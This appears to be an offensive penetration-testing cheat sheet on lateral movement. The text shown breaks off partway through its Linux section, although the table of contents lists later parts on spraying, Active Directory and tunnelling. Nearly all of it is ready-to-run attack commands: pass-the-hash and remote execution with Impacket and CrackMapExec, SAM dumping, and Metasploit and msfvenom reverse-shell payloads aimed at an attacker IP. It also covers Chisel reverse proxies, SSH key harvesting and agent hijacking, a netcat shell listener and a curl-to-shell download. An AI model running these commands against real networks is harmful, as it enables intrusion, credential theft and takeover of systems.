# Lateral Movement

## 🎯 Goal

Use credentials, hashes, and tickets from one compromised host to gain **access to additional systems** and deepen control across the network.

---
## Table of Contents

1. [Strategy and Attack Graphs](#1-strategy-and-attack-graphs)
2. [Windows Lateral Movement](#2-windows-lateral-movement)
3. [Linux Lateral Movement](#3-linux-lateral-movement)
4. [Credential Reuse and Password Spraying](#4-credential-reuse-and-password-spraying)
5. [AD-Specific Movement](#5-ad-specific-lateral-movement)
6. [Pivoting & Tunneling (Ligolo-ng)](#6-pivoting--tunneling-ligolo-ng)

---

## 📋 Phase Checklist

### Strategy & Visualization

- [ ] Visualize Nodes & Edges → [1.1](#11-network-visualization-concept)
- [ ] Identify High-Value Targets → [1.2](#12-high-value-target-prioritization)

### Windows Movement
- [ ] PSExec/SMB Exec → [2.1](#21-psexec-style-execution)
- [ ] WMI Lateral Move → [2.2](#22-wmi-based-movement)
- [ ] WinRM/PS Remoting → [2.3](#23-winrm-and-powershell-remoting)
- [ ] RDP Access → [2.4](#24-rdp-remote-desktop)
- [ ] Service Execution → [2.5](#25-service-based-execution)

### Linux Movement
- [ ] SSH Access/Keys → [3.1](#31-ssh-access)
- [ ] Pivoting → [3.2](#32-pivoting)
- [ ] Harvest SSH Keys → [3.3](#33-ssh-key-harvesting)
- [ ] SSH Agent Hijack → [3.3](#33-ssh-key-harvesting)

### Credential Ops
- [ ] Inventory Creds → [4.1](#41-credential-inventory-management)
- [ ] SMB/WinRM Spray → [4.2](#42-targeted-password-spraying)
- [ ] SSH/RDP Spray → [4.2](#42-targeted-password-spraying)
- [ ] Check Safety/Lockout → [4.3](#43-spraying-safety-measures)

### AD-Specific Movement
- [ ] Pass-the-Hash (PtH) → [5.1](#51-pass-the-hash-pth-strategy)
- [ ] Pass-the-Ticket (PtT) → [5.2](#52-pass-the-ticket-ptt-movement)
- [ ] Golden/Silver Ticket → [5.2](#52-pass-the-ticket-ptt-movement)
- [ ] Hunt Admin Sessions → [5.3](#53-admin-session-exploitation)
- [ ] Dump LSASS/Secrets → [5.3](#53-admin-session-exploitation)

### Attack Path Analysis
- [ ] Run BloodHound → [5.4](#54-bloodhound-informed-movement)
- [ ] Map Shortest Paths → [5.4](#54-bloodhound-informed-movement)
- [ ] Target ACLs/GPOs → [5.4](#54-bloodhound-informed-movement)

### Pivoting & Tunneling
- [ ] Ligolo-ng Setup → [6.1](#61-ligolo-ng-setup)
- [ ] Proxy/Agent Live → [6.2](#62-ligolo-ng-basic-flow)
- [ ] Routes & Listeners → [6.3](#63-routing--port-forwarding)
- [ ] Multi-Hop Ready → [6.4](#64-multi-hop-pivoting)
- [ ] SSH/Chisel Fallbacks → [6.5](#65-ssh--chisel-quick-hits)
---

## 1 Strategy and Attack Graphs

### 1.1 Network Visualization Concept

**Nodes & Edges Approach:**

- **🖥️ Nodes**: Machines (workstations, servers, DCs, network devices)
- **🔗 Edges**: Connection methods (SMB, WinRM, RDP, SSH, WMI)
- **🏷️ Labels**: Access levels (local admin, user, domain admin)

### 1.2 High-Value Target Prioritization

Focus movement on assets that shorten the path to domain impact:

1. 🎯 **Domain Controllers** - Highest value targets
2. 🏰 **Infrastructure Servers** - SQL, Exchange, File Servers
3. 💼 **Workstations with Admin Sessions** - Credential harvesting
4. 🔧 **Jump Servers** - Administrative access points
5. 📊 **Database Servers** - Data and credential storage

---

## 2 Windows Lateral Movement

### 2.1 PSExec-Style Execution

**Impacket PSExec (Linux)**

```bash
# Basic PSExec with password
impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>

# Pass-the-Hash
impacket-psexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>
psexec.py <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>

# With specific command
impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -c "whoami /all"
psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami /all"

# Debug mode for troubleshooting
impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -debug
psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -debug

# With local authentication
impacket-psexec ./administrator:<PASSWORD>@<TARGET_IP>

# Using full hash format (LM:NTLM)
impacket-psexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes <LM_HASH>:<NTLM_HASH>
```

**CrackMapExec for Mass Execution**

```bash
# Scan and execute on multiple hosts
crackmapexec smb <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "whoami"
cme smb <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "whoami"

# Pass-the-Hash across subnet
crackmapexec smb <SUBNET_CIDR> -u <USERNAME> -H <NTLM_HASH> -x "systeminfo"
cme smb <SUBNET_CIDR> -u <USERNAME> -H <NTLM_HASH> -x "systeminfo"

# Execute PowerShell script
crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -X "Get-Process"
cme smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -X '$PSVersionTable'

# Dump SAM from multiple hosts
crackmapexec smb <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' --sam
cme smb <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' --sam

# Check local admin access
crackmapexec smb <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' --local-auth

# Using multiple usernames/passwords from files
crackmapexec smb <SUBNET_CIDR> -u users.txt -p passwords.txt --continue-on-success

# Execute command and save output
crackmapexec smb <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "ipconfig" --no-output
```

**Metasploit PSExec**

```bash
# Module for PSExec
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
set SMBDomain <DOMAIN>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
exploit

# PSExec with Pass-the-Hash
use exploit/windows/smb/psexec
set SMBUser <USERNAME>
set SMBPass <LM_HASH>:<NTLM_HASH>
set RHOSTS <TARGET_IP>
exploit
```

### 2.2 WMI-Based Movement

**Impacket WMIExec**

```bash
# WMI execution with credentials
impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
wmiexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>

# Pass-the-Hash via WMI
impacket-wmiexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>
wmiexec.py <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>

# Interactive shell
impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
wmiexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>

# Single command execution
impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami && ipconfig"
wmiexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami && hostname"

# With local authentication
impacket-wmiexec ./administrator:<PASSWORD>@<TARGET_IP>

# Silent mode (no output to stdout)
wmiexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -silentcommand
```

**PowerShell WMI (From Windows)**

```powershell
# Check WMI availability
Test-WSMan <TARGET_IP>

# Execute command via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName <TARGET_IP>

# Get process list remotely
Get-WmiObject -Class Win32_Process -ComputerName <TARGET_IP>

# With credentials
$Username = '<DOMAIN>\<USERNAME>'
$Password = '<PASSWORD>'
$SecPass = ConvertTo-SecureString $Password -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential($Username, $SecPass)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > <REMOTE_PATH>\output.txt" -ComputerName <TARGET_IP> -Credential $Cred

# Create persistent WMI connection
$Session = New-CimSession -ComputerName <TARGET_IP> -Credential (Get-Credential)
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='whoami'}

# Query system information
Get-WmiObject -Class Win32_OperatingSystem -ComputerName <TARGET_IP> | Select-Object Caption, Version, BuildNumber

# Get installed software
Get-WmiObject -Class Win32_Product -ComputerName <TARGET_IP>
```

**CrackMapExec WMI**

```bash
# WMI execution
crackmapexec wmi <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "whoami"
cme wmi <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "hostname"

# Pass-the-Hash via WMI
crackmapexec wmi <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -x "ipconfig"
```

### 2.3 WinRM and PowerShell Remoting

**Service Detection**

```bash
# Scan for WinRM ports
nmap -p <WINRM_PORTS> <SUBNET_CIDR>
nmap -p <WINRM_PORTS> -sV <SUBNET_CIDR>

# Check WinRM status remotely
crackmapexec winrm <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>'
cme winrm <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>'

# Enumerate WinRM with Metasploit
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS <SUBNET_CIDR>
run
```

**Evil-WinRM (Linux)**

```bash
# Basic WinRM connection
evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH>

# With domain specification
evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>

# Upload files during session
evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -s <SCRIPTS_DIR> -e <EXES_DIR>

# SSL connection
evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -S -P 5986

# Within Evil-WinRM session:
# Upload file
*Evil-WinRM* PS C:\> upload /local/path/file.exe <REMOTE_PATH>\file.exe

# Download file
*Evil-WinRM* PS C:\> download <REMOTE_PATH>\file.txt /local/path/file.txt

# Load PowerShell script
*Evil-WinRM* PS C:\> Invoke-Binary <EXES_DIR>\binary.exe

# Menu
*Evil-WinRM* PS C:\> menu
```

**PowerShell Remoting (From Windows)**

```powershell
# Test connectivity
Test-WSMan <TARGET_IP>
Test-WSMan -ComputerName <TARGET_IP> -Authentication Default

# Enter PSSession
Enter-PSSession -ComputerName <TARGET_IP> -Credential (Get-Credential)

# Execute remote command
Invoke-Command -ComputerName <TARGET_IP> -ScriptBlock { whoami; systeminfo } -Credential (Get-Credential)

# Create persistent session
$Session = New-PSSession -ComputerName <TARGET_IP> -Credential (Get-Credential)
Invoke-Command -Session $Session -ScriptBlock { whoami }

# Multiple computers
Invoke-Command -ComputerName <TARGET_IP>,10.11.1.31,10.11.1.32 -ScriptBlock { Get-Service } -Credential (Get-Credential)

# Execute script file
Invoke-Command -ComputerName <TARGET_IP> -FilePath <REMOTE_PATH>\script.ps1 -Credential (Get-Credential)

# Copy item to remote session
Copy-Item -Path C:\local\file.txt -Destination <REMOTE_PATH>\ -ToSession $Session

# Copy item from remote session
Copy-Item -Path <REMOTE_PATH>\file.txt -Destination C:\local\ -FromSession $Session

# Enable PSRemoting (if you have access)
Enable-PSRemoting -Force

# Configure TrustedHosts (if needed)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "<TARGET_IP>" -Force
```

**CrackMapExec WinRM**

```bash
# Execute commands via WinRM
crackmapexec winrm <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "whoami"
cme winrm <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "hostname"

# Pass-the-Hash via WinRM
crackmapexec winrm <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -x "ipconfig"

# Execute PowerShell command
crackmapexec winrm <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -X '$env:computername'
```

### 2.4 RDP (Remote Desktop)

**Service Detection**

```bash
# Scan for RDP
nmap -p <RDP_PORT> <SUBNET_CIDR>
nmap -p <RDP_PORT> -sV --script rdp-enum-encryption <SUBNET_CIDR>

# Check RDP security
rdp-sec-check <TARGET_IP>

# Metasploit RDP scanner
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <SUBNET_CIDR>
run

# Check for BlueKeep vulnerability
nmap -p <RDP_PORT> --script rdp-vuln-ms12-020 <SUBNET_CIDR>
```

**xfreerdp (Linux)**

```bash
# Basic RDP connection
xfreerdp /u:<DOMAIN>\\<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> /dynamic-resolution /cert:ignore

# Alternative syntax
xfreerdp /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /v:<TARGET_IP> /cert:ignore

# Pass-the-Hash (if supported - requires freerdp 2.0+)
xfreerdp /u:<DOMAIN>\\<USERNAME> /pth:<NTLM_HASH> /v:<TARGET_IP> /dynamic-resolution /cert:ignore

# With specific domain
xfreerdp /u:<USERNAME> /d:<DOMAIN> /p:<PASSWORD> /v:<TARGET_IP> /cert:ignore

# Multiple monitors and drive sharing
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> +home-drive /multimon

# Full screen mode
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> /f /cert:ignore

# Share local directory
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> /drive:share,<LOCAL_SHARE_DIR> /cert:ignore

# Custom resolution
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> /size:1920x1080 /cert:ignore

# Clipboard sharing
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> +clipboard /cert:ignore

# Network level authentication
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> /sec:nla /cert:ignore
```

**rdesktop (Alternative)**

```bash
# Basic connection
rdesktop -u <USERNAME> -p <PASSWORD> -d <DOMAIN> <TARGET_IP>

# Full screen
rdesktop -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -f <TARGET_IP>

# Custom geometry
rdesktop -u <USERNAME> -p <PASSWORD> -g 1920x1080 <TARGET_IP>

# Sound redirection
rdesktop -u <USERNAME> -p <PASSWORD> -r sound:local <TARGET_IP>

# Share directory
rdesktop -u <USERNAME> -p <PASSWORD> -r disk:share=<LOCAL_SHARE_DIR> <TARGET_IP>
```

**RDP Session Management**

```powershell
# Check RDP sessions remotely
qwinsta /server:<TARGET_IP>
query user /server:<TARGET_IP>

# Log off specific session
rwinsta 1 /server:<TARGET_IP>
logoff 1 /server:<TARGET_IP>

# Enable RDP remotely (requires admin access)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Via registry
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Enable RDP firewall rule
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Check RDP status
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"
```

**CrackMapExec RDP**

```bash
# Check RDP access
crackmapexec rdp <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>'
cme rdp <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>'

# Screenshot capability
crackmapexec rdp <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' --screenshot
```

### 2.5 Service-Based Execution

**SC Manager Methods**

```powershell
# Create service remotely
sc \\<TARGET_IP> create "<SERVICE_NAME>" binPath= "cmd.exe /c <REMOTE_PATH>\payload.exe"
sc \\<TARGET_IP> start "<SERVICE_NAME>"
sc \\<TARGET_IP> delete "<SERVICE_NAME>"

# Query service status
sc \\<TARGET_IP> query "<SERVICE_NAME>"

# Create service with specific user
sc \\<TARGET_IP> create "<SERVICE_NAME>" binPath= "<REMOTE_PATH>\payload.exe" obj= "NT AUTHORITY\SYSTEM"

# Using WMI for service creation
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList @($null,$null,"<SERVICE_NAME>","<REMOTE_PATH>\payload.exe",16,$null,$null,$null,$null,$null,$null) -ComputerName <TARGET_IP>

# PowerShell service creation
New-Service -Name "<SERVICE_NAME>" -BinaryPathName "<REMOTE_PATH>\payload.exe" -ComputerName <TARGET_IP> -StartupType Manual
Start-Service -Name "<SERVICE_NAME>" -ComputerName <TARGET_IP>
Remove-Service -Name "<SERVICE_NAME>" -ComputerName <TARGET_IP>
```

**Impacket Services**

```bash
# Impacket services execution
impacket-services <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> list
impacket-services <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> start <SERVICE_NAME>
impacket-services <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> stop <SERVICE_NAME>

# Create and start service
impacket-services <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> create -name <SERVICE_NAME> -display "Temp Service" -path "<REMOTE_PATH>\payload.exe"
impacket-services <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> start <SERVICE_NAME>
```

**SchTasks for Execution**

```powershell
# Create scheduled task remotely
schtasks /create /s <TARGET_IP> /tn "<TASK_NAME>" /tr "<REMOTE_PATH>\payload.exe" /sc once /st 00:00 /ru "SYSTEM"

# Run task immediately
schtasks /run /s <TARGET_IP> /tn "<TASK_NAME>"

# Delete task
schtasks /delete /s <TARGET_IP> /tn "<TASK_NAME>" /f

# Create task with specific user
schtasks /create /s <TARGET_IP> /u <DOMAIN>\<USERNAME> /p <PASSWORD> /tn "<TASK_NAME>" /tr "<REMOTE_PATH>\payload.exe" /sc once /st 00:00

# List tasks
schtasks /query /s <TARGET_IP> /fo LIST /v

# Create task that runs at logon
schtasks /create /s <TARGET_IP> /tn "<TASK_NAME>" /tr "<REMOTE_PATH>\payload.exe" /sc onlogon /ru "SYSTEM"

# Run with highest privileges
schtasks /create /s <TARGET_IP> /tn "<TASK_NAME>" /tr "<REMOTE_PATH>\payload.exe" /sc once /st 00:00 /rl HIGHEST
```

**Impacket AtExec**

```bash
# Execute command via Task Scheduler
impacket-atexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami"
atexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami"

# Pass-the-Hash
impacket-atexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH> "systeminfo"
atexec.py <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH> "systeminfo"

# Execute command and retrieve output
atexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "powershell -c Get-Process"
```

**DCOM Execution**

```powershell
# MMC20.Application execution
$com = [Type]::GetTypeFromProgID("MMC20.Application","<TARGET_IP>")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","Minimized")

# ShellWindows DCOM
$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","<TARGET_IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)

# ShellBrowserWindow DCOM
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","<TARGET_IP>")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)
```

**Impacket DcomExec**

```bash
# DCOM execution
impacket-dcomexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami"
dcomexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami"

# Pass-the-Hash
impacket-dcomexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH> "systeminfo"

# Specify DCOM object
dcomexec.py -object MMC20 <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
```

---

## 3 Linux Lateral Movement

### 3.1 SSH Access

**Basic SSH Connections**

```bash
# Password authentication
ssh user@10.11.2.10

# Key-based authentication
ssh -i /path/to/private_key user@10.11.2.10

# Specific port
ssh -p 2222 user@10.11.2.10

# With command execution
ssh user@10.11.2.10 "whoami; cat /etc/passwd"

# Verbose mode for troubleshooting
ssh -v user@10.11.2.10
ssh -vv user@10.11.2.10
ssh -vvv user@10.11.2.10

# Disable host key checking (pentesting only)
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@10.11.2.10

# X11 forwarding
ssh -X user@10.11.2.10

# Compression
ssh -C user@10.11.2.10

# Keep alive
ssh -o ServerAliveInterval=60 user@10.11.2.10
```

**SSH Key Management**

```bash
# Generate new key pair
ssh-keygen -t rsa -b 4096 -f /tmp/lateral_key
ssh-keygen -t ed25519 -f /tmp/lateral_key

# Generate with no passphrase
ssh-keygen -t rsa -b 4096 -f /tmp/lateral_key -N ""

# Copy public key to target
ssh-copy-id -i /tmp/lateral_key.pub user@10.11.2.10

# Manual key copy
cat /tmp/lateral_key.pub | ssh user@10.11.2.10 "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# Use specific key
ssh -i /tmp/lateral_key user@10.11.2.10

# Change key permissions (if needed)
chmod 600 /tmp/lateral_key
chmod 644 /tmp/lateral_key.pub

# Convert SSH key formats
ssh-keygen -p -m PEM -f /tmp/lateral_key
```

**SSH Config for Efficiency**

```bash
# ~/.ssh/config
Host target-server
    HostName 10.11.2.10
    User privileged-user
    Port 22
    IdentityFile ~/.ssh/lateral_key
    ServerAliveInterval 60
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    
Host jump-box
    HostName 10.11.1.100
    User jumpuser
    IdentityFile ~/.ssh/jump_key
    
Host internal-server
    HostName 10.11.3.50
    User root
    ProxyJump jump-box
    IdentityFile ~/.ssh/internal_key

# Usage
ssh target-server
ssh internal-server
```

**SSH Tunneling**

```bash
# Local port forwarding
ssh -L 8080:localhost:80 user@10.11.2.10

# Remote port forwarding
ssh -R 8080:localhost:80 user@10.11.2.10

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@10.11.2.10

# Bind to all interfaces
ssh -D 0.0.0.0:1080 user@10.11.2.10

# Multiple port forwards
ssh -L 8080:localhost:80 -L 3306:localhost:3306 user@10.11.2.10

# Keep tunnel alive in background
ssh -f -N -L 8080:localhost:80 user@10.11.2.10
```

### 3.2 Pivoting

**SSH Dynamic Forwarding**

```bash
# Create SOCKS proxy
ssh -D 1080 user@10.11.2.10

# Background mode
ssh -f -N -D 1080 user@10.11.2.10

# Multiple hops
ssh -J jumpuser@10.11.1.100 targetuser@10.11.2.10

# Multiple jump hosts
ssh -J jumpuser1@10.11.1.100,jumpuser2@10.11.2.50 targetuser@10.11.3.10

# ProxyJump with dynamic forwarding
ssh -J jumpuser@10.11.1.100 -D 1080 targetuser@10.11.2.10
```

**Proxychains Configuration**

```bash
# /etc/proxychains.conf or /etc/proxychains4.conf
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks4  127.0.0.1 1080

# For SOCKS5
socks5  127.0.0.1 1080

# Chain multiple proxies
socks4  127.0.0.1 1080
socks5  127.0.0.1 1081
```

**Proxychains Usage**

```bash
# Network scanning through proxy
proxychains nmap -sT -Pn 10.11.3.0/24
proxychains4 nmap -sT -Pn -p 22,80,443 10.11.3.0/24

# SMB enumeration through proxy
proxychains smbclient -L //10.11.3.20 -N
proxychains enum4linux -a 10.11.3.20

# Web application testing
proxychains curl http://10.11.3.50/admin/
proxychains wget http://10.11.3.50/backup.zip

# Database connections
proxychains mysql -h 10.11.3.60 -u admin -p
proxychains psql -h 10.11.3.60 -U postgres

# Metasploit through proxy
proxychains msfconsole
proxychains msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o payload.elf

# SSH through proxy
proxychains ssh user@10.11.3.100

# FTP through proxy
proxychains ftp 10.11.3.80

# RDP through proxy
proxychains xfreerdp /u:user /p:password /v:10.11.3.30
```

**SSH Port Forwarding Chains**

```bash
# First hop
ssh -L 2222:10.11.2.10:22 user@10.11.1.100

# Second hop through first
ssh -p 2222 -L 3333:10.11.3.50:22 user@localhost

# Access final target
ssh -p 3333 user@localhost

# All-in-one with ProxyCommand
ssh -o ProxyCommand="ssh -W %h:%p user@10.11.1.100" user@10.11.2.10
```

**Chisel for Pivoting**

```bash
# On your attack machine (Chisel server)
./chisel server -p 8000 --reverse

# On compromised host (Chisel client)
./chisel client 10.10.14.5:8000 R:1080:socks

# Use with proxychains
proxychains nmap -sT 10.11.3.0/24

# Forward specific port
./chisel client 10.10.14.5:8000 R:8080:10.11.3.50:80

# Multiple forwards
./chisel client 10.10.14.5:8000 R:8080:10.11.3.50:80 R:3389:10.11.3.60:3389
```

**Metasploit Pivoting**

```bash
# Add route through meterpreter session
route add 10.11.3.0 255.255.255.0 1

# Use auxiliary modules through pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.11.3.0/24
set PORTS 22,80,443
run

# Socks proxy through meterpreter
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 4a
run -j

# Then configure proxychains and use it
proxychains nmap -sT 10.11.3.0/24
```

### 3.3 SSH Key Harvesting

**Common Key Locations**

```bash
# Search for SSH keys
find /home -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null

# Check SSH directories
ls -la ~/.ssh/
ls -la /home/*/.ssh/
ls -la /root/.ssh/

# Look for authorized_keys
find / -name "authorized_keys" 2>/dev/null

# Search for private keys with specific permissions
find / -name "id_*" -o -name "*.pem" 2>/dev/null | xargs ls -la

# Search in common backup locations
find / -path "*backup*" -name "id_*" 2>/dev/null
find / -path "*bak*" -name "*.pem" 2>/dev/null

# Check for keys in unusual locations
find /var /opt /usr/local -name "id_*" -o -name "*.pem" 2>/dev/null

# Search for encrypted keys
grep -r "ENCRYPTED" /home/*/.ssh/ 2>/dev/null
grep -r "ENCRYPTED" /root/.ssh/ 2>/dev/null

# Look for SSH config files
find / -name "ssh_config" -o -name "sshd_config" 2>/dev/null

# Check for known_hosts (may reveal other targets)
find / -name "known_hosts" 2>/dev/null
cat ~/.ssh/known_hosts
```

**SSH Key Analysis**

```bash
# Check key type
ssh-keygen -l -f /path/to/key

# Get fingerprint
ssh-keygen -lf /path/to/key

# Test key without logging in
ssh -i /path/to/key -o BatchMode=yes -o ConnectTimeout=5 user@10.11.2.10 echo "Success"

# Extract public key from private key
ssh-keygen -y -f /path/to/private_key > public_key.pub

# Check if key is encrypted
head -n 2 /path/to/private_key | grep "ENCRYPTED"

# Crack encrypted SSH key
ssh2john /path/to/encrypted_key > ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```

**SSH Agent Hijacking**

```bash
# Check for running SSH agent
echo "$SSH_AUTH_SOCK"
env | grep SSH

# List loaded keys
ssh-add -l

# Find SSH agent sockets
find /tmp -name "agent.*" 2>/dev/null
ps aux | grep ssh-agent

# Hijack SSH agent (if you have access to the socket)
export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.12345
ssh-add -l

# Use agent for forwarding
ssh -A user@10.11.2.10

# Dump keys from agent (with appropriate access)
ps aux | grep ssh-agent
sudo gdb -p [PID]
call (char*)malloc(1000000)
dump memory /tmp/agent_dump 0x[ADDRESS] 0x[ADDRESS]+1000000
```

**Automated SSH Key Hunting**

```bash
# Script to find and test SSH keys
#!/bin/bash
for key in $(find / -name "id_*" -o -name "*.pem" 2>/dev/null); do
    echo "Testing key: $key"
    chmod 600 "$key" 2>/dev/null
    for user in root admin user ubuntu centos; do
        for host in 10.11.2.10 10.11.2.20 10.11.2.30; do
            timeout 5 ssh -i "$key" -o StrictHostKeyChecking=no -o BatchMode=yes "$user@$host" "echo '[+] Success: $user@$host with $key'" 2>/dev/null
        done
    done
done

# LinPEAS SSH key enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual extraction of SSH configuration
cat /etc/ssh/sshd_config | grep -v "^#"
```

### 3.4 Alternative Linux Movement

**RSH/Rexec (Legacy)**

```bash
# If enabled (rare in modern systems)
rsh -l user 10.11.2.10 whoami
rexec -l user 10.11.2.10 whoami

# Check if rsh/rexec are available
which rsh rexec
netstat -ant | grep 512
netstat -ant | grep 513
netstat -ant | grep 514

# Scan for rsh services
nmap -p 512,513,514 10.11.2.0/24
```

**SSH Reverse Shells**

```bash
# Create reverse shell via SSH
ssh -R 8888:127.0.0.1:9998 user@10.11.2.10

# Remote port forwarding for access
ssh -R 3389:10.11.3.30:3389 user@10.11.2.10

# Reverse SOCKS proxy
ssh -R 1080 user@10.11.2.10

# Persistent reverse tunnel
autossh -M 0 -R 8888:localhost:22 user@10.11.2.10 -f -N

# Create reverse tunnel and execute commands
ssh -R 8888:localhost:22 user@10.11.2.10 "while true; do nc -l -p 9999 -e /bin/bash; done"
```

**Ansible for Lateral Movement**

```bash
# If Ansible is installed on compromised host
ansible all -i "10.11.2.10,10.11.2.20," -m shell -a "whoami" --user=root --ask-pass

# Using Ansible playbook
cat > lateral.yml << EOF
---
- hosts: all
  tasks:
    - name: Execute command
      shell: whoami
EOF

